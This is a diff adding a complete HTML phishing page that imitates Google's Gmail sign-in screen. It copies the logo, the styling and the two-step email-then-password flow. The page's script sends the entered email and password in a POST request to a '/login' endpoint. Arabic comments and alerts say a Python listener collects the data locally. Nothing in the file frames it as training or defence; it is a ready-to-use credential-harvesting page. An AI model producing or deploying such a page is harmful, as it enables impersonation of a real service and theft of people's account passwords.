@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #1f1f1f;
+            color: #e3e3e3;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1040px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Card Layout */
+        .card {
+            background-color: #0b0b0b;
+            border-radius: 28px;
+            width: 100%;
+            min-height: 440px;
+            display: flex;
+            padding: 36px;
+            gap: 40px;
+            margin-bottom: 24px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Left Side */
+        .left-side {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            padding-top: 12px;
+        }
+
+        .logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 24px;
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 400;
+            color: #e3e3e3;
+            margin-bottom: 12px;
+            line-height: 44px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #e3e3e3;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        /* Right Side */
+        .right-side {
+            flex: 1.1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding-top: 12px;
+            min-height: 330px;
+        }
+
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        /* Steps handling */
+        .step {
+            display: none;
+            flex-direction: column;
+            animation: fadeIn 0.4s ease forwards;
+        }
+
+        .step.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Input Box */
+        .input-group {
+            position: relative;
+            width: 100%;
+            margin-top: 12px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px;
+            background: transparent;
+            border: 1px solid #8e918f;
+            border-radius: 4px;
+            outline: none;
+            color: #e3e3e3;
+            font-family: 'Roboto', sans-serif;
+            font-size: 16px;
+            transition: border-color 0.15s ease;
+        }
+
+        .input-group input:focus {
+            border: 2px solid #a8c7fa;
+            padding: 15px;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: #0b0b0b;
+            padding: 0 4px;
+            color: #c4c7c5;
+            font-family: 'Roboto', sans-serif;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.15s ease all;
+        }
+
+        .input-group input:focus ~ label,
+        .input-group input:not(:placeholder-shown) ~ label {
+            top: 0;
+            font-size: 12px;
+            color: #a8c7fa;
+        }
+
+        /* Link Buttons */
+        .link-btn {
+            background: none;
+            border: none;
+            color: #a8c7fa;
+            font-family: 'Google Sans', sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            text-align: left;
+            width: fit-content;
+            margin-top: 8px;
+        }
+
+        .link-btn:hover {
+            text-decoration: underline;
+        }
+
+        .guest-text {
+            font-size: 14px;
+            line-height: 20px;
+            color: #c4c7c5;
+            font-family: 'Roboto', sans-serif;
+            margin-top: 26px;
+        }
+
+        .guest-text a {
+            color: #a8c7fa;
+            text-decoration: none;
+        }
+
+        /* Custom Checkbox */
+        .show-password-container {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-top: 16px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .show-password-container input[type="checkbox"] {
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #c4c7c5;
+            border-radius: 2px;
+            background: transparent;
+            outline: none;
+            cursor: pointer;
+            display: grid;
+            place-content: center;
+        }
+
+        .show-password-container input[type="checkbox"]:checked {
+            border-color: #a8c7fa;
+            background-color: #a8c7fa;
+        }
+
+        .show-password-container input[type="checkbox"]::before {
+            content: "";
+            width: 10px;
+            height: 8px;
+            transform: scale(0);
+            background-color: #0b0b0b;
+            clip-path: polygon(14% 44%, 0 65%, 50% 100%, 100% 16%, 80% 0%, 43% 62%);
+        }
+
+        .show-password-container input[type="checkbox"]:checked::before {
+            transform: scale(1);
+        }
+
+        /* User Chip */
+        .user-chip {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background-color: rgba(255, 255, 255, 0.07);
+            border: 1px solid #444746;
+            border-radius: 100px;
+            padding: 4px 12px 4px 4px;
+            width: fit-content;
+            margin-bottom: 24px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .user-chip .avatar {
+            width: 20px;
+            height: 20px;
+            background-color: #a8c7fa;
+            color: #0b0b0b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: bold;
+        }
+
+        /* Buttons */
+        .actions {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 16px;
+            margin-top: 32px;
+        }
+
+        .secondary-btn {
+            background: none;
+            border: none;
+            color: #a8c7fa;
+            font-family: 'Google Sans', sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 10px 16px;
+            border-radius: 100px;
+        }
+
+        .next-btn {
+            background-color: #a8c7fa;
+            color: #0b0b0b;
+            border: none;
+            font-family: 'Google Sans', sans-serif;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
+            border-radius: 100px;
+            cursor: pointer;
+        }
+
+        /* Footer */
+        .footer {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 16px;
+            font-size: 12px;
+            color: #c4c7c5;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-links a {
+            color: #c4c7c5;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <main class="card">
+        <!-- Left Section -->
+        <section class="left-side">
+            <svg class="logo" viewBox="0 0 24 24" width="24" height="24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
+                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 12-4.53z" fill="#EA4335"/>
+            </svg>
+            <h1 id="main-heading">Sign in</h1>
+            <p class="subtitle" id="main-subtitle">to continue to Gmail</p>
+        </section>
+
+        <!-- Right Section -->
+        <section class="right-side">
+            <!-- STEP 1: Email -->
+            <div id="step-email" class="step active">
+                <div class="form-container">
+                    <div class="input-group">
+                        <input type="text" id="email" placeholder=" " autocomplete="off" required>
+                        <label for="email">Email or phone</label>
+                    </div>
+                    <button type="button" class="link-btn">Forgot email?</button>
+                    <p class="guest-text">Not your computer? Use Guest mode to sign in privately.</p>
+                </div>
+                <div class="actions">
+                    <button type="button" class="secondary-btn">Create account</button>
+                    <button type="button" class="next-btn" onclick="nextStep()">Next</button>
+                </div>
+            </div>
+
+            <!-- STEP 2: Password -->
+            <div id="step-password" class="step">
+                <div class="form-container">
+                    <div class="user-chip" onclick="prevStep()">
+                        <div class="avatar" id="avatar-letter">U</div>
+                        <span id="display-user-email">user@gmail.com</span>
+                    </div>
+
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder=" " autocomplete="off" required>
+                        <label for="password">Enter your password</label>
+                    </div>
+
+                    <label class="show-password-container">
+                        <input type="checkbox" id="show-password" onchange="togglePasswordVisibility()">
+                        <span>Show password</span>
+                    </label>
+                </div>
+                <div class="actions">
+                    <button type="button" class="secondary-btn" style="margin-right: auto;" onclick="prevStep()">Forgot password?</button>
+                    <button type="button" class="next-btn" onclick="submitForm()">Next</button>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div>English (United States)</div>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </footer>
+</div>
+
+<script>
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const mainHeading = document.getElementById('main-heading');
+    const mainSubtitle = document.getElementById('main-subtitle');
+    const stepEmail = document.getElementById('step-email');
+    const stepPassword = document.getElementById('step-password');
+    const displayUserEmail = document.getElementById('display-user-email');
+    const avatarLetter = document.getElementById('avatar-letter');
+    const showPasswordCheckbox = document.getElementById('show-password');
+
+    function nextStep() {
+        if (emailInput.value.trim() === "") {
+            emailInput.focus();
+            return;
+        }
+        mainHeading.textContent = "Welcome";
+        mainSubtitle.textContent = "To continue, first verify it's you";
+        displayUserEmail.textContent = emailInput.value;
+        avatarLetter.textContent = emailInput.value.charAt(0).toUpperCase();
+
+        stepEmail.classList.remove('active');
+        stepPassword.classList.add('active');
+        setTimeout(() => passwordInput.focus(), 100);
+    }
+
+    function prevStep() {
+        mainHeading.textContent = "Sign in";
+        mainSubtitle.textContent = "to continue to Gmail";
+        stepPassword.classList.remove('active');
+        stepEmail.classList.add('active');
+        passwordInput.value = "";
+        showPasswordCheckbox.checked = false;
+        passwordInput.type = "password";
+        setTimeout(() => emailInput.focus(), 100);
+    }
+
+    function togglePasswordVisibility() {
+        passwordInput.type = showPasswordCheckbox.checked ? "text" : "password";
+    }
+
+    // إرسال البيانات المجمعة للسيرفر المحلي
+    function submitForm() {
+        const emailVal = emailInput.value.trim();
+        const passwordVal = passwordInput.value.trim();
+
+        if (passwordVal === "") {
+            passwordInput.focus();
+            return;
+        }
+
+        // إرسال طلب POST عبر الشبكة المحلية
+        fetch('/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: emailVal, password: passwordVal })
+        })
+        .then(res => res.text())
+        .then(data => {
+            alert("تم إرسال البيانات بنجاح! راقب شاشة البايثون السوداء الآن.");
+        })
+        .catch(err => {
+            alert("فشل الإرسال. تأكد من تشغيل ملف البايثون أولاً!");
+        });
+    }
+</script>
+</body>
+</html>
